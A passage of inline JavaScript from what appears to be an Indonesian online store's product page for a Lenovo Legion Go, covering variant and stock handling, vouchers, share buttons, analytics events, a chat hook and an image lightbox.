            if (elOri) elOri.style.display='none';
            if (elDisc) elDisc.style.display='none';
        }

        const stock = v ? (parseInt(v.stock||0,10)||0) : 0;
        let effectiveStock = stock;
        let isActivePreorder = false;
        if (window.isPreorderProduct && v && 'preorder_remaining' in v && v.preorder_remaining !== null) {
            effectiveStock = parseInt(v.preorder_remaining, 10);
            if (isNaN(effectiveStock)) effectiveStock = 0;
            isActivePreorder = true;
        }
        if (elStock){
            elStock.classList.remove('in','out');
            if (effectiveStock>0){ 
                elStock.classList.add('in'); 
                elStock.textContent = IS_DIGITAL ? 'Tersedia' : (isActivePreorder ? 'Sisa Slot: ' + effectiveStock : 'Stok: ' + formatStockLabel(effectiveStock)); 
            } else { 
                elStock.classList.add('out'); 
                elStock.textContent = 'Habis'; 
            }
        }
        if (elQty){
            elQty.max = String(effectiveStock>0?effectiveStock:0);
            if (effectiveStock<=0) { elQty.value = '0'; elQty.disabled = true; }
            else { if (parseInt(elQty.value||'1',10) < 1) elQty.value='1'; elQty.disabled=false; }
        }
        
        const shouldDisable = !(v && effectiveStock>0);
        const updateButtons = () => {
            const btnAddCart = document.getElementById('btn-add-cart');
            const btnBuyNow = document.getElementById('btn-buy');
            const mobileCart = document.getElementById('mf-cart');
            const mobileBuy = document.getElementById('mf-buy');
            [btnAddCart, btnBuyNow, mobileCart, mobileBuy].forEach(btn => {
                if (!btn) return;
                if (shouldDisable) {
                    btn.disabled = true;
                    btn.setAttribute('disabled', 'disabled');
                    btn.classList.add('stock-disabled');
                    btn.setAttribute('data-stock-blocked', 'true');
                    btn.setAttribute('data-stock-reason', window.isPreorderProduct ? 'Pre-order habis' : 'Stok habis');
                } else {
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.classList.remove('stock-disabled');
                    btn.removeAttribute('data-stock-blocked');
                    btn.removeAttribute('data-stock-reason');
                }
            });
        };
        updateButtons();
        setTimeout(updateButtons, 10);
        setTimeout(updateButtons, 50);
        setTimeout(updateButtons, 100);
        if (mfBuy && v) {
            const voucherBtn = document.getElementById('btn-buy-voucher');
            const voucherCode = fab ? fab.dataset.voucherCode : '';
            let voucherDiscount = 0;
            
            if (voucherBtn && voucherCode) {
                const vType = voucherBtn.dataset.voucherType;
                const vValue = parseFloat(voucherBtn.dataset.voucherValue) || 0;
                const vMax = parseFloat(voucherBtn.dataset.voucherMax) || 0;
                const finalPrice = v.final || 0;
                if (vType && vValue > 0) {
                    voucherDiscount = calcVoucherDisc(vType, vValue, finalPrice, vMax);
                    if (fab) fab.dataset.voucherValue = voucherDiscount.toString();
                }
            }
            
            const finalPrice = v.final || 0;
            const textEl = mfBuy.querySelector('.mf-buy-text');
            const priceEl = mfBuy.querySelector('.mf-buy-price');
            
            if (effectiveStock > 0) {
                    if (IS_PREORDER) {
                        if (textEl) textEl.textContent = 'Pre Order Sekarang';
                        if (priceEl) priceEl.textContent = rupiah(finalPrice);
                    } else if (voucherCode && voucherDiscount > 0) {
                        if (textEl) textEl.textContent = 'Beli dengan Voucher';
                        if (priceEl) priceEl.textContent = rupiah(Math.max(0, finalPrice - voucherDiscount));
                    } else {
                        if (textEl) textEl.textContent = 'Beli Sekarang';
                        if (priceEl) priceEl.textContent = rupiah(finalPrice);
                    }
                } else {
                    if (textEl) textEl.textContent = 'Stok Habis';
                    if (priceEl) priceEl.textContent = rupiah(finalPrice);
                }
            }
        
        const isMobile = window.initMobile ?? 0;
        if (window.instSetBasePrice) window.instSetBasePrice(v ? (isMobile == '1' ? v.ori : v.final) : 0);
        if (window.updateSoldBySku) window.updateSoldBySku(v.sku);
        updateBranchPopover(v);
        if (v && v.image_url && focusImage) focusGalleryByUrl(v.image_url);
        if (v) {
            window.dispatchEvent(new CustomEvent('pd-variant-changed', {
                detail: {
                    price: v.final,
                    originalPrice: v.ori,
                    discount: v.disc,
                    stock: effectiveStock,
                    sku: v.sku,
                    variant_id: v.id
                }
            }));
            
            const encodedHash = encodeVariantHash(v.id);
            if (encodedHash && window.history && window.history.replaceState) {
                const newHash = '#v=' + encodedHash;
                const newUrl = window.location.pathname + window.location.search + newHash;
                window.history.replaceState(null, '', newUrl);
            }
        }
    }

    let sel = readSelection();
    if (autoFillMissing(sel)) sel = readSelection();

    let v = findVariant(sel);
    if (!v) {
        const candidates = variants.filter(variant=>{
            return attrOrder.every(a=>{
                if (!sel[a]) return true;
                return variant.attrs[a] === sel[a];
            });
        });
        if (candidates.length >= 1) {
            v = candidates[0];
            attrOrder.forEach(a=> sel[a] = v.attrs[a]);
            attrOrder.forEach(a=>{
                const val = sel[a];
                const input = document.querySelector(`.v-group[data-attr="${CSS.escape(a)}"] input[type=radio][value="${CSS.escape(val)}"]`);
                if (input) input.checked = true;
            });
        }
    }

    const initSel = readSelection();
    const initVar = findVariant(initSel) || variants[0] || null;
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => applyVariant(initVar, false));
    } else {
        applyVariant(initVar, false);
    }
    
function updateSummary(sel){Object.entries(sel).forEach(([a,val])=>{const el=document.getElementById('vs-'+a);if(el)el.textContent=val||'-'})}
    function refreshOptions(sel){
        attrOrder.forEach(a=>{
            const group = document.querySelector(`.v-group[data-attr="${CSS.escape(a)}"]`);
            if (!group) return;
            const chips = group.querySelectorAll('.v-chip');
            chips.forEach(ch=>{
                const val = ch.getAttribute('data-value');
                const possible = variants.some(v=>{
                    if (v.attrs[a] !== val) return false;
                    for (const a2 of attrOrder) {
                        if (a2 === a) continue;
                        if (sel[a2] && v.attrs[a2] !== sel[a2]) return false;
                    }
                    return true;
                });
                const input = ch.querySelector('input[type=radio]');
                const disabled = !possible;
                if (input) input.disabled = disabled;
                ch.classList.toggle('disabled', disabled);

                let candidateVariant = null;
                if (possible) {
                    candidateVariant = variants.find(v=>{
                        if (v.attrs[a] !== val) return false;
                        for (const a2 of attrOrder) {
                            if (a2 === a) continue;
                            if (sel[a2] && v.attrs[a2] !== sel[a2]) return false;
                        }
                        return true;
                    });
                }
                const outOfStock = candidateVariant ? (window.isPreorderProduct && candidateVariant.preorder_remaining !== null ? candidateVariant.preorder_remaining <= 0 : candidateVariant.stock <= 0) : false;
                ch.classList.toggle('out', !disabled && outOfStock);
                const badge = ch.querySelector('.chip-badge');
                if (badge) badge.hidden = !(candidateVariant && outOfStock);
            });
            group.querySelectorAll('.v-chip').forEach(ch=>{
                const input = ch.querySelector('input[type=radio]');
                ch.classList.toggle('selected', input && input.checked);
            });
        });
    }
    updateSummary(sel);
    refreshOptions(sel);
    document.querySelectorAll('.v-chip').forEach(chip=>{const input=chip.querySelector('input[type=radio]');if(input&&input.checked){chip.classList.add('selected');}});

    const container = document.getElementById('pd-variants');
    container && container.addEventListener('change', function(ev){
        const radio = ev.target.closest('input[type=radio]');
        if (!radio) return;
        sel = readSelection();
        if (autoFillMissing(sel)) sel = readSelection();
        const chosen = findVariant(sel);
        applyVariant(chosen || null, true);
        
        updateSummary(sel);
        refreshOptions(sel);
    });
    
window.applyVariant=applyVariant;
})();

(function cleanBrokenDescImages(){
    const containers = [
        document.querySelector('.pd-full-desc-body'),
        document.querySelector('.pd-short-desc')
    ].filter(Boolean);

    containers.forEach(root => {
        const imgs = root.querySelectorAll('img');
        imgs.forEach(img => {
            if (img.complete && img.naturalWidth === 0) {
                img.remove();
                return;
            }
            img.addEventListener('error', () => {
                img.remove();
            }, { once:true });
        });
    });
})();

/* ====== Scroll To Top ====== */
(function _0xi25j(){const a=document.getElementById('pd-scroll-top');if(!a)return;function b(){if(window.matchMedia('(max-width:640px)').matches){const d=document.querySelector('.bottom-nav'),e=document.querySelector('.pd-mobile-fab');if(!d&&!e){setTimeout(b,100);return}const f=d&&window.getComputedStyle(d).display!=='none'&&window.getComputedStyle(d).visibility!=='hidden',g=e&&window.getComputedStyle(e).display!=='none'&&window.getComputedStyle(e).visibility!=='hidden';let h;if(f&&g){h='calc(68px + 54px + env(safe-area-inset-bottom))'}else if(g){h='calc(68px + 8px + env(safe-area-inset-bottom))'}else if(f){h='calc(60px + env(safe-area-inset-bottom))'}else{h='calc(20px + env(safe-area-inset-bottom))'}a.style.setProperty('--scroll-top-bottom',h)}else{a.style.removeProperty('--scroll-top-bottom')}}function c(){const d=window.pageYOffset||document.documentElement.scrollTop||0,e=d>300;a.classList.toggle('visible',e);a.setAttribute('aria-hidden',e?'false':'true');b()}window.addEventListener('scroll',c,{passive:!0});window.addEventListener('resize',b,{passive:!0});setTimeout(b,100);c();a.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})})})();

/* Format stok 10+ */
function _0xk67l(n){n=parseInt(n||0,10)||0;return n>10?'10+':String(n)}

/* Toggle popover stok per cabang */
(function _0xm89n(){const a=document.getElementById('pd-stock-info-btn'),b=document.getElementById('pd-stock-popover'),c=document.getElementById('pd-stock-popover-close');if(!a||!b)return;function d(){if(window.matchMedia('(min-width: 641px)').matches){const e=document.getElementById('pd-stock-badge');if(!e)return;const f=e.getBoundingClientRect(),g=window.pageXOffset||document.documentElement.scrollLeft||0,h=window.pageYOffset||document.documentElement.scrollTop||0;b.style.left=(f.left+g-10)+'px';b.style.top=(f.bottom+h+10)+'px'}else{b.style.left='';b.style.top=''}}
function e(){d();b.classList.add('show');a.setAttribute('aria-expanded','true');b.setAttribute('aria-hidden','false');document.addEventListener('click',g,{capture:true});window.addEventListener('resize',d,{passive:true});window.addEventListener('scroll',d,{passive:true})}function f(){b.classList.remove('show');a.setAttribute('aria-expanded','false');b.setAttribute('aria-hidden','true');document.removeEventListener('click',g,{capture:true});window.removeEventListener('resize',d);window.removeEventListener('scroll',d)}function g(h){if(b.contains(h.target)||a.contains(h.target))return;f()}
a.addEventListener('click',function(h){h.preventDefault();b.classList.contains('show')?f():e()});if(c)c.addEventListener('click',f)})();

/* ===== Share Product Modal ===== */
(function(){const a=document.getElementById('pd-share-btn'),z=document.getElementById('mf-share'),b=document.getElementById('pd-share-modal-overlay'),c=document.getElementById('pd-share-close'),d=document.getElementById('pd-share-copy-url-btn'),e=document.getElementById('pd-share-url-input');if((!a&&!z)||!b)return;const f="https://shortt.ink/anakbinjai",g="Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Win 11 Home/Eclipse Black/3Y",h="Rp 20.789.000";const discountPercent=1;let i='';if(discountPercent>0){i=`ðŸ”¥ Lagi Promo Nih! Diskon ${discountPercent}%\n\nâœ¨ ${g}\nðŸ’° Cuma ${h} aja!\n\nðŸ›’ Buruan cek sebelum kehabisan!\nðŸ‘‰ `}else{i=`âœ¨ Ada barang bagus nih!\n\nðŸ“¦ ${g}\nðŸ’¸ Harga: ${h}\n\nðŸ›ï¸ Yuk, langsung cek!\nðŸ‘‰ `}function j(){b.classList.add('show');document.body.style.overflow='hidden'}function k(){b.classList.remove('show');document.body.style.overflow=''}if(a)a.addEventListener('click',j);if(z)z.addEventListener('click',j);if(c)c.addEventListener('click',k);b.addEventListener('click',function(l){if(l.target===b)k()});document.addEventListener('keydown',function(l){if(l.key==='Escape'&&b.classList.contains('show'))k()});b.addEventListener('click',function(l){const m=l.target.closest('[data-share]');if(!m)return;const n=m.getAttribute('data-share'),o=encodeURIComponent(f),p=encodeURIComponent(i),q=encodeURIComponent(g);let r='';switch(n){case 'whatsapp':r=`https://wa.me/?text=${p}${o}`;break;case 'facebook':r=`https://www.facebook.com/sharer/sharer.php?u=${o}`;break;case 'twitter':r=`https://twitter.com/intent/tweet?text=${p}${o}`;break;case 'telegram':r=`https://t.me/share/url?url=${o}&text=${p}`;break;case 'email':r=`mailto:?subject=${encodeURIComponent('ðŸ”¥ Cek Produk Keren Ini!')}&body=${p}${o}`;window.location.href=r;k();return;case 'copy':s();return;case 'pdf':const ps=document.querySelector('.product-single');if(ps){ps.setAttribute('data-print-date',new Date().toLocaleDateString('id-ID',{year:'numeric',month:'long',day:'numeric'}))}k();setTimeout(function(){window.print();try{if(window.ga4Ecomm&&window.ga4Ecomm.trackEvent)window.ga4Ecomm.trackEvent('share',{method:'pdf_export',content_type:'product',item_id:"SB0B3T"})}catch(_){}},300);return}if(r){window.open(r,'_blank','noopener,noreferrer');try{if(window.ga4Ecomm&&window.ga4Ecomm.trackEvent)window.ga4Ecomm.trackEvent('share',{method:n,content_type:'product',item_id:"SB0B3T"})}catch(_){}}});function s(){if(!e)return;e.select();e.setSelectionRange(0,99999);try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(f).then(function(){t()}).catch(function(){document.execCommand('copy');t()})}else{document.execCommand('copy');t()}}catch(u){console.error('Failed to copy:',u)}}function t(){if(!d)return;const v=d.innerHTML;d.classList.add('copied');d.innerHTML='<svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg><span class="pd-share-copy-text">Tersalin!</span>';if(window.showToast)showToast({type:'success',title:'âœ¨ Link Tersalin!',message:'Link produk berhasil disalin. Yuk bagikan ke teman!',duration:3000});setTimeout(function(){d.classList.remove('copied');d.innerHTML=v},2000)}if(d)d.addEventListener('click',s);if(navigator.share){const shareHandler=function(w){w.preventDefault();navigator.share({title:g,text:i+f,url:f}).catch(function(x){console.log('Native share cancelled or failed:',x)})};if(a)a.addEventListener('dblclick',shareHandler);if(z)z.addEventListener('dblclick',shareHandler)}})();

/* ===== Embedding variants (server â†’ client) ===== */
(function(){
  window.__PD_VARIANTS_WITH_BRANCH__ = [];
})();

/* ===== Helper: update angka popover ===== */
function updateStockPopoverForVariant(v){
  try{
    const elMeg = document.getElementById('sp-qty-meg');
    const elMdf = document.getElementById('sp-qty-mdf');
    const elBda = document.getElementById('sp-qty-bda');

    if (typeof v?.smm === 'number' && elMeg) elMeg.textContent = formatStockLabel(Math.max(0, v.smm|0));
    if (typeof v?.smf === 'number' && elMdf) elMdf.textContent = formatStockLabel(Math.max(0, v.smf|0));
    if (typeof v?.sba === 'number' && elBda) elBda.textContent = formatStockLabel(Math.max(0, v.sba|0));
  }catch(_){}
}

/* ===== applyVariant: 10+ dan update popover ===== */
(function patchApplyVariant(){
  if (typeof applyVariant !== 'function') return;
  const original = applyVariant;
  window.applyVariant = function(v){
    original(v);
    
    try {
      const elStock = document.getElementById('pd-stock-badge');
      if (elStock){
        let txt = elStock.textContent || '';
        let m = txt.match(/\d+/);
        if (m) {
          const n = parseInt(m[0]||'0',10)||0;
          elStock.textContent = (n>0) ? ('Stok: ' + formatStockLabel(n)) : 'Habis';
        }
      }
    } catch(_){}
if(window.__PD_VARIANTS_WITH_BRANCH__&&v){const vv=window.__PD_VARIANTS_WITH_BRANCH__.find(x=>x.id===v.id)||v;updateStockPopoverForVariant(vv)}
  };
})();

(function initCurrentVariantBranch(){
  const list = window.__PD_VARIANTS_WITH_BRANCH__ || [];
  if (!list.length) return;
  const hid = document.getElementById('pd-variant-id');
  const vid = hid ? parseInt(hid.value||'0',10) : 0;
  const current = list.find(x => x.id === vid) || list[0] || null;
  if (current) updateStockPopoverForVariant(current);
})();

(function(){
    if (!window.ga4Ecomm) return;
    const catSegs = ["Komputer & Laptop","Laptop","Gaming"];
    window.ga4Ecomm.viewItem({
      currency: 'IDR',
      value: 20789000,
      item_id: "SB0B3T",
      item_name: "Lenovo Legion Go 8ASP2 - 83N0000RID /AMD Ryzen Z2 Extreme/32GB/1TB SSD/AMD Radeon Graphics/8.8\" WUXGA OLED Touch/Win 11 Home/Eclipse Black/3Y",
      item_brand: "Lenovo ",
      item_category: catSegs && catSegs.length ? catSegs.join(' / ') : ''
    });
  })();
  
(function patchApplyVariantFocus(){
  if (typeof applyVariant !== 'function') return;
  const original = applyVariant;
  window.applyVariant = function(v, focusImage = true){
    
    original(v, focusImage);
    
    if (focusImage && v && v.image_url) {
      _0xau1v(v.image_url);
    }
  };
})();

(function() {
  var soldMap = [];
  var soldTotalLabel = "Terjual 2";

  function formatSoldLabel(qty) {
    if (qty >= 1000000) {
      var v = Math.floor((qty / 100000) ) / 10;
      return 'Terjual ' + (String(v).replace('.', ',')) + 'jt+';
    }
    if (qty >= 1000) {
      var v2 = Math.floor((qty / 100) ) / 10;
      return 'Terjual ' + (String(v2).replace('.', ',')) + 'rb+';
    }
    if (qty >= 100) {
      var v2 = Math.floor((qty / 100) ) * 100;
      return 'Terjual ' + (String(v2).replace('.', ',')) + '+';
    }
    if (qty >= 10) {
      var v2 = Math.floor((qty / 10) ) * 10;
      return 'Terjual ' + (String(v2).replace('.', ',')) + '+';
    }
    return 'Terjual ' + (qty.toLocaleString('id-ID'));
  }

  function updateSoldLabel(labelText) {
    var el = document.querySelector('#pd-sold-inline, [data-role="sold-chip"]');
    if (el) el.textContent = labelText;
  }

  window.updateSoldBySku = function(sku) {
    if (!sku || typeof sku !== 'string') {
      updateSoldLabel(soldTotalLabel);
      return;
    }
    var qty = soldMap[sku] || 0;
    updateSoldLabel(formatSoldLabel(qty));
  };

    updateSoldLabel(soldTotalLabel);
  })();

(function(){const h=document.getElementById('pd-sticky-header');if(!h)return;const p=document.getElementById('pd-price-anchor');const ac=document.getElementById('pd-sticky-add-cart');const by=document.getElementById('pd-sticky-buy');let lt=window.scrollY;let tk=false;function u(){if(!p)return;const r=p.getBoundingClientRect();const s=window.scrollY;if(r.top<0){h.classList.add('visible')}else{h.classList.remove('visible')}lt=s;tk=false}function rt(){if(!tk){window.requestAnimationFrame(u);tk=true}}window.addEventListener('scroll',rt,{passive:true});u();function sy(){const ma=document.getElementById('btn-add-cart');const mb=document.getElementById('btn-buy');if(ac&&ma){ac.disabled=ma.disabled}if(by&&mb){by.disabled=mb.disabled}}sy();const ob=new MutationObserver(sy);const ma=document.getElementById('btn-add-cart');const mb=document.getElementById('btn-buy');if(ma)ob.observe(ma,{attributes:true,attributeFilter:['disabled']});if(mb)ob.observe(mb,{attributes:true,attributeFilter:['disabled']});const ss=document.getElementById('pd-sticky-share-btn');const ms=document.getElementById('pd-share-btn');if(ss&&ms){ss.addEventListener('click',function(e){e.preventDefault();ms.click()})}if(ac){ac.addEventListener('click',function(e){e.preventDefault();if(ac.disabled)return;const m=document.getElementById('btn-add-cart');if(m&&!m.disabled){m.click()}})}if(by){by.addEventListener('click',function(e){e.preventDefault();if(by.disabled)return;const m=document.getElementById('btn-buy');if(m&&!m.disabled&&window.buyNow){window.buyNow(e)}})}
function getChatProductData(){const varInput=document.getElementById('pd-variant-id');const variantId=varInput?parseInt(varInput.value||'0',10):0;const variantSummary=getVariantSummaryText();const priceEl=document.getElementById('pd-price-current');const currentPrice=priceEl?priceEl.textContent.trim():'Rp 20.789.000';const pd={id:325,name:"Lenovo Legion Go 8ASP2 - 83N0000RID \/AMD Ryzen Z2 Extreme\/32GB\/1TB SSD\/AMD Radeon Graphics\/8.8\" WUXGA OLED Touch\/Win 11 Home\/Eclipse Black\/3Y",price:currentPrice,image:"\/uploads\/products\/lenovo-legion-go-8asp2-83n0000rid.webp",url:window.location.href};if(variantId>0){pd.variant_id=variantId}if(variantSummary){pd.variant_summary=variantSummary}return pd}
const ch=document.getElementById('pd-sticky-chat');if(ch){ch.addEventListener('click',function(e){e.preventDefault();if(!window.plazaChat){console.warn('Chat widget not loaded');return}window.plazaChat.attachProduct(getChatProductData());window.plazaChat.openWidget()})}const dch=document.getElementById('btn-chat-icon');if(dch){dch.addEventListener('click',function(e){e.preventDefault();if(!window.plazaChat){console.warn('Chat widget not loaded');return}window.plazaChat.attachProduct(getChatProductData());window.plazaChat.openWidget()})}const mch=document.getElementById('mf-chat');if(mch){mch.addEventListener('click',function(e){e.preventDefault();if(!window.plazaChat){console.warn('Chat widget not loaded');return}window.plazaChat.attachProduct(getChatProductData());window.plazaChat.openWidget()})}window.addEventListener('pd-variant-changed',function(e){const d=e.detail||{};if(d.price!==undefined){const sp=document.getElementById('pd-sticky-price');if(sp){sp.textContent=formatRupiah(d.price)}}if(d.originalPrice!==undefined&&d.originalPrice>d.price){const so=document.getElementById('pd-sticky-price-original');if(so){so.textContent=formatRupiah(d.originalPrice);so.style.display=''}}else{const so=document.getElementById('pd-sticky-price-original');if(so){so.style.display='none'}}if(d.discount!==undefined&&d.discount>0){const sd=document.getElementById('pd-sticky-discount');if(sd){sd.textContent='-'+d.discount+'%';sd.style.display=''}}else{const sd=document.getElementById('pd-sticky-discount');if(sd){sd.style.display='none'}}const hs=d.stock>0;if(ac){ac.disabled=!hs}if(by){by.disabled=!hs}});function formatRupiah(n){return'Rp'+Math.floor(n).toLocaleString('id-ID')}})();

(function(){const t=document.getElementById('pdv-toggle-btn');const v=document.getElementById('pd-voucher-section');if(t&&v){const h=v.querySelectorAll('.pdv-min-hidden');const n=h.length;t.addEventListener('click',function(){const e=t.classList.toggle('expanded');h.forEach(function(i){if(e){i.classList.remove('pdv-min-hidden')}else{i.classList.add('pdv-min-hidden')}});t.textContent=e?'Tutup':'+'+n})}const m=document.getElementById('voucher-detail-modal');const mc=document.getElementById('voucher-modal-close');const ma=document.getElementById('voucher-modal-cancel');const mcp=document.getElementById('voucher-modal-copy');if(m){const bb=document.querySelectorAll('.pdv-badge-btn');bb.forEach(function(btn){btn.addEventListener('click',function(){if(btn.disabled)return;const c=btn.getAttribute('data-voucher-code');const nm=btn.getAttribute('data-voucher-name');const dl=btn.getAttribute('data-discount-label');const bl=btn.getAttribute('data-badge-label');const mp=parseInt(btn.getAttribute('data-min-purchase'));const md=parseInt(btn.getAttribute('data-max-discount'));const vu=btn.getAttribute('data-valid-until');document.getElementById('voucher-modal-badge').innerHTML='<span class="vmb-value">'+dl+'</span><span class="vmb-label">'+bl+'</span>';document.getElementById('voucher-modal-code').textContent=c;document.getElementById('voucher-modal-name').textContent=nm;const me=document.getElementById('voucher-modal-min');if(mp>0){me.style.display='';document.getElementById('voucher-modal-min-val').textContent=fr(mp)}else{me.style.display='none'}const xe=document.getElementById('voucher-modal-max');if(md>0){xe.style.display='';document.getElementById('voucher-modal-max-val').textContent=fr(md)}else{xe.style.display='none'}if(vu){const d=new Date(vu);const ft=d.toLocaleDateString('id-ID',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});document.getElementById('voucher-modal-valid-val').textContent=ft}mcp.setAttribute('data-code',c);m.classList.add('show');document.body.style.overflow='hidden'})});function cm(){m.classList.remove('show');document.body.style.overflow=''}if(mc)mc.addEventListener('click',cm);if(ma)ma.addEventListener('click',cm);m.addEventListener('click',function(e){if(e.target===m)cm()});if(mcp){mcp.addEventListener('click',function(){const c=mcp.getAttribute('data-code');if(!c)return;if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(c).then(function(){smc()}).catch(function(err){fc(c)})}else{fc(c)}})}}const b=document.querySelectorAll('.pdv-min-copy');b.forEach(function(btn){btn.addEventListener('click',function(){if(btn.disabled)return;const code=btn.getAttribute('data-code');if(!code)return;if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(code).then(function(){sc(btn)}).catch(function(err){fc(code,btn)})}else{fc(code,btn)}})});function fc(text,btn){const tx=document.createElement('textarea');tx.value=text;tx.style.position='fixed';tx.style.opacity='0';document.body.appendChild(tx);tx.select();try{document.execCommand('copy');if(btn)sc(btn);else smc()}catch(err){}document.body.removeChild(tx)}function sc(btn){const o=btn.textContent;btn.classList.add('copied');btn.textContent='âœ“ Tersalin';setTimeout(function(){btn.classList.remove('copied');btn.textContent=o},2000)}function smc(){const o=mcp.textContent;mcp.textContent='âœ“ Kode Tersalin';mcp.style.background='#22c55e';setTimeout(function(){mcp.textContent=o;mcp.style.background=''},2000)}function fr(a){return'Rp'+Math.floor(a).toLocaleString('id-ID')}})();
</script>
<script nonce="se3iyzEHMc9FQEB4wSyd0w==">
window.PD_ID=325;window.PD_NAME=_0x3c4d;window.PD_SKU=_0x5e6f;window.PD_CATEGORY_PATH="Komputer & Laptop/Laptop/Gaming";window.PD_BEST_VOUCHER=null;
window.IS_DIGITAL=IS_DIGITAL;
window.isPreorderProduct=false;
window.PD_PREORDER_DATA=null;
</script>

<script data-inlined="pd-lightbox.js">
// PlazaIT Product Lightbox (vanilla, no CDN) â€” v4 (swipe-down to close)
(function(){
  const state = {
    items: [],
    open: false,
    idx: 0,
    scale: 1,
    minScale: 1,
    maxScale: 4,
    tx: 0, ty: 0,
    isDragging: false,
    dragStartX: 0, dragStartY: 0,
    baseTx: 0, baseTy: 0,
    touchStartX: 0, touchStartY: 0,
    lastTap: 0,
    swipeMode: 'none', // 'none' | 'h' | 'v'
    totalDx: 0, totalDy: 0
  };

  let root, imgEl, counterEl, btnPrev, btnNext, btnClose, canvas;

  const ORIGIN = (location.origin || (location.protocol + '//' + location.host));

  function absUrl(u){
    if (!u) return '';
    try {
      if (/^https?:\/\//i.test(u)) return u;
      return new URL(u, ORIGIN).href;
    } catch(_) { return u; }
  }
  function fileName(u){
    try { return new URL(u, ORIGIN).pathname.split('/').pop().toLowerCase(); }
    catch(_){ return String(u||'').split('/').pop().toLowerCase(); }
  }

  function buildItems(){
    const gd = (window.galleryData || []).filter(Boolean);
    if (gd.length){
      state.items = gd.map(g => ({
        src: absUrl(g.url), alt: g.alt || '', slug: g.slug || '', w: g.w || 1200, h: g.h || 1200
      })).filter(it => !!it.src);
      return;
    }
    const thumbs = document.querySelectorAll('.pd-thumb-btn');
    state.items = Array.from(thumbs).map(btn => {
      const raw = btn.getAttribute('data-full') || '';
      return { src: absUrl(raw), alt: btn.getAttribute('data-alt') || '', slug: btn.getAttribute('data-slug') || '', w: 1200, h: 1200 };
    }).filter(it => !!it.src);
  }

  function ensureUI(){
    if (root) return;
    root = document.createElement('div');
    root.className = 'pd-lb';
    root.id = 'pd-lightbox';
    root.setAttribute('role','dialog');
    root.setAttribute('aria-modal','true');
    root.setAttribute('aria-hidden','true');
    root.setAttribute('tabindex','-1');

    // Canvas terlebih dulu (z-index di CSS membuat tombol di atas)
    root.innerHTML = `
      <div class="pd-lb-canvas"><img class="pd-lb-img" id="pd-lb-img" alt=""></div>
      <button class="pd-lb-close" aria-label="Tutup" title="Tutup">&times;</button>
      <button class="pd-lb-prev" aria-label="Sebelumnya" title="Sebelumnya">&#10094;</button>
      <button class="pd-lb-next" aria-label="Berikutnya" title="Berikutnya">&#10095;</button>
      <div class="pd-lb-counter" id="pd-lb-counter">1 / 1</div>
    `;
    document.body.appendChild(root);

    imgEl     = root.querySelector('#pd-lb-img');
    counterEl = root.querySelector('#pd-lb-counter');
    btnPrev   = root.querySelector('.pd-lb-prev');
    btnNext   = root.querySelector('.pd-lb-next');
    btnClose  = root.querySelector('.pd-lb-close');
    canvas    = root.querySelector('.pd-lb-canvas');

    // Button clicks
    btnPrev.addEventListener('click', (e)=>{ e.stopPropagation(); prev(); });
    btnNext.addEventListener('click', (e)=>{ e.stopPropagation(); next(); });
    btnClose.addEventListener('click', (e)=>{ e.stopPropagation(); close(); });

    // Klik backdrop untuk tutup
    root.addEventListener('click', (e)=>{ if (e.target === root) close(); });

    // Keyboard global
    document.addEventListener('keydown', (e)=>{
      if (!state.open) return;
      if (e.key === 'Escape') { e.preventDefault(); close(); }
      if (e.key === 'ArrowRight') { e.preventDefault(); next(); }
      if (e.key === 'ArrowLeft')  { e.preventDefault(); prev(); }
    });

    // Wheel zoom (desktop)
    root.addEventListener('wheel', (e)=>{
      if (!state.open) return;
      e.preventDefault();
      const delta = -Math.sign(e.deltaY) * 0.2;
      zoomAt(delta, e.clientX, e.clientY);
    }, { passive: false });

    // Drag pan (mouse)
    canvas.addEventListener('mousedown', (e)=>{
      if (state.scale <= 1) return;
      state.isDragging = true;
      state.dragStartX = e.clientX;
      state.dragStartY = e.clientY;
      state.baseTx = state.tx;
      state.baseTy = state.ty;
      e.preventDefault();
    });
    window.addEventListener('mousemove', (e)=>{
      if (!state.isDragging) return;
      const dx = e.clientX - state.dragStartX;
      const dy = e.clientY - state.dragStartY;
      setTranslate(state.baseTx + dx, state.baseTy + dy);
    });
    window.addEventListener('mouseup', ()=>{ state.isDragging = false; });

    // Touch: swipe navigate (H), swipe-down close (V), double-tap zoom, drag pan
    canvas.addEventListener('touchstart', (e)=>{
      if (!state.open) return;
      if (e.touches.length === 1) {
        const t = e.touches[0];
        state.touchStartX = t.clientX;
        state.touchStartY = t.clientY;
        state.totalDx = 0;
        state.totalDy = 0;
        state.swipeMode = 'none';

        state.isDragging = state.scale > 1;
        state.dragStartX = t.clientX;
        state.dragStartY = t.clientY;
        state.baseTx = state.tx;
        state.baseTy = state.ty;

        // Double-tap toggle zoom
        const now = Date.now();
        if (now - state.lastTap < 300) {
          if (state.scale > 1) resetTransform(); else zoomAt(+1, t.clientX, t.clientY, 2);
          state.lastTap = 0;
          e.preventDefault();
          return;
        }
        state.lastTap = now;
      }
    }, { passive: true });

    canvas.addEventListener('touchmove', (e)=>{
      if (!state.open) return;

      // Drag pan saat zoom
      if (state.isDragging && e.touches.length === 1 && state.scale > 1) {
        e.preventDefault();
        const t = e.touches[0];
        const dx = t.clientX - state.dragStartX;
        const dy = t.clientY - state.dragStartY;
        setTranslate(state.baseTx + dx, state.baseTy + dy);
        return;
      }

      // Gesture saat scale <= 1
      if (state.scale <= 1 && e.touches.length === 1) {
        const t = e.touches[0];
        const dx = t.clientX - state.touchStartX;
        const dy = t.clientY - state.touchStartY;
        state.totalDx = dx; state.totalDy = dy;

        // Tentukan mode swipe di awal gerakan
        if (state.swipeMode === 'none') {
          const absX = Math.abs(dx), absY = Math.abs(dy);
          if (absY > 12 && absY > absX * 1.3) {
            state.swipeMode = 'v'; // swipe vertical (untuk close)
          } else if (absX > 12 && absX > absY * 1.3) {
            state.swipeMode = 'h'; // swipe horizontal (ganti slide)
          }
        }

